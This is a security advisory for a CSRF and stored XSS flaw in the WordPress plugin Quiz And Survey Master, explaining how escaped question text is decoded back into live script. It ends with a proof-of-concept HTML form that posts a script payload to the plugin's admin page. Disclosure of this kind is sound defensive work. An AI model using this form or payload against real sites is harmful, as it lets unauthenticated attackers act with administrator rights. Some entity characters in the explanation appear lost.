CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)

Description
================
CSRF/stored XSS in Quiz And Survey Master (Formerly Quiz Master Next) allows unauthenticated attackers to do almost anything an admin can

Vulnerability
================
A CSRF vulnerability allows an unauthenticated attacker to add questions to existing quizzes.
The question_name parameter is put into a manually-constructed JavaScript object and escaped with esc_js() (php/qmn_options_questions_tab.php line 499). If the user (or attacker) creates a new question on a quiz containing “<script>alert(1)</script>” in the question_name field then “question: ‘<script>alert(1)</script>’,” will get output inside the JS object. All good so far.
However, in js/admin_question.js on line 205, we see this line, as part of some JS-generated HTML:
jQuery(\'<textarea/>\').html(questions_list[i].question.replace(/\"/g, \'\"\').replace(/\'/g, \"\'\")).text()+
This looks okay. We’re creating a TEXTAREA element, setting its HTML to the value of the question_name parameter, and extracting the .text() of it. If we did jQuery(‘<textarea/>’).html(‘<script>alert(1)</script>’).text() we would get “alert(1)” as the output.
However, that’s not how inline JavaScript gets parsed. Between a <script> and a </script>, the HTML parser actually parses “<” as “<” not as “<“. So if we do jQuery(‘<textarea/>’).html(‘<script>alert(1)</script>’).text() we get “<script>alert(1)</script>”.
And since “<script>alert(1)</script>” doesn’t appear anywhere in the page, Chrome’s reflected XSS mitigation measures are not activated. Thus the stored XSS attack can be executed immediately.

Proof of concept
================
-->

Click the submit button on the following page (in a real attack the form can be submitted without user interaction):
<form method=\"POST\" action=\"http://localhost/wp-admin/admin.php?page=mlw_quiz_options&quiz_id=1\">
<input type=\"text\" name=\"question_type\" value=\"0\">
<input type=\"text\" name=\"question_name\" value=\"<script>alert(1)</script>\">
<input type=\"text\" name=\"question_submission\" value=\"new_question\">
<input type=\"text\" name=\"quiz_id\" value=\"1\">
<input type=\"submit\">
</form>
